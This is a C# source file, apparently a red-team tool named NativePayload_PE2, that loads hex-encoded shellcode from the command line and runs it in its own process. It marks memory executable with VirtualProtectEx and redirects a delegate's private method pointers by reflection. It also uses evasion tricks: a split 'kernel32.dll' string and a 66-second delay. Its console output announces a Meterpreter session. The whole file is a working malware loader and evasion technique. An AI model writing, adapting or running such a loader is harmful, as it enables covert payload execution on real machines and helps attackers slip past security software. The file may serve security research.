using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace NativePayload_PE2
{
    class Program
    {
        [DllImport("ke" + "rne" + "l" + "32.dll")]
        public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public static void showcmd(string step, string s, IntPtr p)
        {
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write("Step{0} Delegate.Invoke(", step);
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("{0}", p.ToString("X8"));
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.Write(") Intptr Done.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write(" [API::{0}]", s);
            Console.WriteLine();
        }
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_PE2 , Published by Damon Mohammadbagher , 2022");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("NativePayload_PE2 Asm Bytes + Thread Injection into local Process + C# Delegation [unsafe method]");
            Console.WriteLine();

            /// use this readkey if you want to use API Monitor v2 and ...
            //Console.ReadKey();

            string[] X = args[0].Split(',');
            byte[] _asm_shell = new byte[X.Length];
            for (int i = 0; i < X.Length; i++)
                _asm_shell[i] = Convert.ToByte(X[i], 16);

            Func<int> _MethodDelegate = () => 20; 
           
            unsafe
            {
                Delegate _Delegate = new Action(() =>
                {
                    fixed (byte* ptr = _asm_shell)
                    {
                        IntPtr ProcessHandle = OpenProcess(0x001F0FFF, false, System.Diagnostics.Process.GetCurrentProcess().Id);
                        showcmd("1", "OpenProcess", ProcessHandle);
                        var _MemAdd = (IntPtr)ptr;

                        VirtualProtectEx(ProcessHandle, _MemAdd, (UIntPtr)_asm_shell.Length, 0x40, out uint _);
                        showcmd("2", "VirtualProtectEx [Set to 0x40 (RWX mode)", _MemAdd);

                        FieldInfo _methodPtr = typeof(Delegate).GetField("_methodPtr", BindingFlags.NonPublic | BindingFlags.Instance);
                        FieldInfo _methodPtrAux = typeof(Delegate).GetField("_methodPtrAux", BindingFlags.NonPublic | BindingFlags.Instance);
                        showcmd("3", "Set delay 66000 milliseconds, wait...", IntPtr.Zero);

                        Thread.Sleep(66000);

                        _methodPtr.SetValue(_MethodDelegate, (IntPtr)ptr);
                        _methodPtrAux.SetValue(_MethodDelegate, (IntPtr)ptr);
                       
                        VirtualProtectEx(ProcessHandle, _MemAdd, (UIntPtr)_asm_shell.Length, 0x10, out uint _);
                        showcmd("4", "VirtualProtectEx [Set to 0x10 (X mode)", _MemAdd);
                        Console.WriteLine("\nBingo Meterpreter Session by Thread Injection Method + Delegations [unsafe method] ;)");

                        _MethodDelegate();
                    }
                });

                _Delegate.DynamicInvoke();
            }

            Console.ReadKey();
        }
    }
}
